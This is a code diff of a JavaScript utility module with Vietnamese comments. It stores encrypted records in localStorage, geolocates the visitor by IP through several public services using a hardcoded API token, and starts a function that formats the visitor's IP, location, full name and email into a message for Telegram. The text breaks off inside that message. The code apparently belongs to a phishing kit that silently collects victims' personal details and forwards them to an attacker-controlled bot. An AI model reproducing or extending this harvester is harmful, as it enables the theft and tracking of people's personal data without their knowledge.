@@ -1,205 +1,146 @@
+// Utilities
 const Utils = {
-
     encrypt(text) {
-        return CryptoJS.AES.encrypt(
-            text,
-            CONFIG.SECRET_KEY
-        ).toString();
+        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
     },
 
     decrypt(cipherText) {
-        const bytes = CryptoJS.AES.decrypt(
-            cipherText,
-            CONFIG.SECRET_KEY
-        );
-
+        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
         return bytes.toString(CryptoJS.enc.Utf8);
     },
 
     saveRecord(key, value) {
         try {
-            const encryptedValue = this.encrypt(
-                JSON.stringify(value)
-            );
-
-            const record = {
-                value: encryptedValue,
-                expiry: Date.now() + CONFIG.STORAGE_EXPIRY
-            };
-
-            localStorage.setItem(
-                key,
-                JSON.stringify(record)
-            );
-
+            const encryptedValue = this.encrypt(JSON.stringify(value));
+            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
+            localStorage.setItem(key, JSON.stringify(record));
         } catch (error) {
-            console.error("Save error:", error);
+            console.error('Save error:', error);
         }
     },
 
     getRecord(key) {
         try {
             const item = localStorage.getItem(key);
-
             if (!item) return null;
-
-            const record = JSON.parse(item);
-
-            if (!record.value || !record.expiry) {
+            const { value, expiry } = JSON.parse(item);
+            if (Date.now() > expiry) {
                 localStorage.removeItem(key);
                 return null;
             }
-
-            if (Date.now() > record.expiry) {
-                localStorage.removeItem(key);
-                return null;
-            }
-
-            const decrypted = this.decrypt(record.value);
-
-            return decrypted
-                ? JSON.parse(decrypted)
-                : null;
-
+            const decrypted = this.decrypt(value);
+            return decrypted ? JSON.parse(decrypted) : null;
         } catch (error) {
-            console.error("Get record error:", error);
             return null;
         }
     },
 
     async getUserIp() {
         try {
-            const response = await fetch(
-                "https://api.ipify.org?format=json",
-                {
-                    method: "GET",
-                    cache: "no-store"
-                }
-            );
-
-            if (!response.ok) {
-                throw new Error(
-                    `IP API error: ${response.status}`
-                );
-            }
-
+            const response = await fetch('https://api.ipify.org?format=json');
             const data = await response.json();
-
-            return data?.ip || "N/A";
-
+            return data.ip;
         } catch (error) {
-            console.error(
-                "Error getting IP:",
-                error
-            );
-
-            return "N/A";
+            console.error('Error getting IP:', error);
+            return 'N/A';
         }
     },
 
-    async getUserLocation() {
+async getUserLocation() {
+    let ip = "N/A";
+    let city = "N/A";
+    let region = "N/A";
+    let country = "N/A";
+    let countryCode = "N/A";
 
-        let ip = "N/A";
-        let city = "N/A";
-        let region = "N/A";
-        let country = "N/A";
-        let countryCode = "N/A";
+    // 1. Lấy IP
+    try {
+        ip = await this.getUserIp();
+    } catch (error) {
+        console.error("IP error:", error);
+    }
 
-        // -----------------------------
-        // 1. Lấy IP từ ipify
-        // -----------------------------
-        try {
-            ip = await this.getUserIp();
-        } catch (error) {
-            console.error(
-                "IP fallback error:",
-                error
-            );
-        }
-
-        // -----------------------------
-        // 2. Lấy location từ IPInfo
-        // -----------------------------
-        try {
-
-            const response = await fetch(
-                "https://ipinfo.io/json?token=5a58a2d85996e3",
-                {
-                    method: "GET",
-                    cache: "no-store"
-                }
-            );
-
-            if (!response.ok) {
-                throw new Error(
-                    `IPInfo error: ${response.status}`
-                );
+    // 2. Lấy thông tin location
+    try {
+        const response = await fetch(
+            "https://ipinfo.io/json?token=5a58a2d85996e3",
+            {
+                method: "GET",
+                cache: "no-store"
             }
-
-            const data = await response.json();
-
-            if (data?.ip) {
-                ip = data.ip;
-            }
-
-            if (data?.city) {
-                city = data.city;
-            }
-
-            if (data?.region) {
-                region = data.region;
-            }
-
-            if (data?.country) {
-                country = data.country;
-                countryCode = data.country;
-            }
-
-        } catch (error) {
-
-            console.error(
-                "Location error:",
-                error
-            );
-        }
-
-        // -----------------------------
-        // 3. Tạo Location sạch
-        // -----------------------------
-        const parts = [
-            city,
-            region,
-            country
-        ].filter(
-            value =>
-                value &&
-                value !== "N/A"
         );
 
-        const location =
-            parts.length > 0
-                ? parts.join(" | ")
-                : "N/A";
+        if (!response.ok) {
+            throw new Error(`IPInfo error: ${response.status}`);
+        }
 
-        return {
-            ip: ip || "N/A",
-            location,
-            country_code: countryCode || "N/A",
-            region: region || "N/A",
-            country: country || "N/A"
-        };
-    },
+        const data = await response.json();
 
-    async sendToTelegram(data) {
+        ip = data.ip || ip;
+        city = data.city || "N/A";
+        region = data.region || "N/A";
+        country = data.country || "N/A";
+        countryCode = data.country || "N/A";
 
+    } catch (error) {
+        console.error("Location API error:", error);
+
+        // Fallback nếu IPInfo lỗi
         try {
+            const response = await fetch(
+                `https://ipapi.co/${ip}/json/`,
+                {
+                    method: "GET",
+                    cache: "no-store"
+                }
+            );
 
-            const locationData =
-                await this.getUserLocation();
+            if (response.ok) {
+                const data = await response.json();
 
-            const text = `
+                city = data.city || "N/A";
+                region = data.region || "N/A";
+                country = data.country_name || "N/A";
+                countryCode = data.country_code || "N/A";
+            }
+
+        } catch (fallbackError) {
+            console.error(
+                "Location fallback error:",
+                fallbackError
+            );
+        }
+    }
+
+    // 3. Tạo Location
+    const parts = [
+        city,
+        region,
+        country
+    ].filter(value =>
+        value &&
+        value !== "N/A"
+    );
+
+    const location =
+        parts.length > 0
+            ? parts.join(" | ")
+            : "N/A";
+
+    return {
+        ip: ip || "N/A",
+        location,
+        country_code: countryCode || "N/A",
+        region: region || "N/A",
+        country: country || "N/A"
+    };
+},
+    async sendToTelegram(data) {
+        const locationData = await this.getUserLocation();
+
+        const text = `
 <b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location})</code>
+<b>Location:</b> <code>${locationData.location}</code>
 ----------------------------------
 <b>Full Name:</b> <code>${data.fullName || ''}</code>
 <b>Email:</b> <code>${data.email || ''}</code>
